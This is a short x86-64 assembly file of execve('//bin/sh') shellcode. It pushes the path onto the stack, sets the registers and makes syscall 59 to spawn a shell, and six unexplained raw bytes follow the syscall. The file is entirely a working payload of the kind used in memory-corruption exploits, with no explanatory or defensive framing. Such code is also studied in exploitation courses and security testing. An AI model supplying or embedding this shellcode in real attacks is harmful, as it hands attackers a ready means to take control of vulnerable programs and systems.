.global main
.type main, @function
main:
	xor %rdx, %rdx;
	push %rdx; 
	pop %rsi;
	push %rdx;
	mov $0x68732f6e69622f2f, %rcx ;
	push %rcx;
	push %rsp;
	pop %rdi;
	push $0x3b ;
	pop %rax ; 
	syscall ;
	.byte 0x0c, 0xf0, 0x0f, 0xff, 0xaa, 0xaa
	
